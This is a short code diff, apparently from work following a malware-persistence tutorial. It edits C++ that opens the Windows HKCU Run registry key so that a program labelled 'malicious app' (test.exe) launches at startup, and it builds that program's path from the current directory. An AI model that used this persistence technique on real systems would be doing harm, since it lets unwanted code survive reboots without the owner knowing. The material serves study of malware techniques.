@@ -6,11 +6,13 @@ https://cocomelonc.github.io/tutorial/2022/04/20/malware-pers-1.html
 */
 #include <windows.h>
 #include <string.h>
+#include <filesystem>
 
 int main(int argc, char* argv[]) {
   HKEY hkey = NULL;
   // malicious app
-  const char* exe = "D:\\zuyd\\C++ecurity\\test.exe";
+  std::string current_File = std::filesystem::current_path().string() + "\\test.exe";
+  const char* exe = current_File.c_str();
 
   // startup
   LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0 , KEY_WRITE, &hkey);
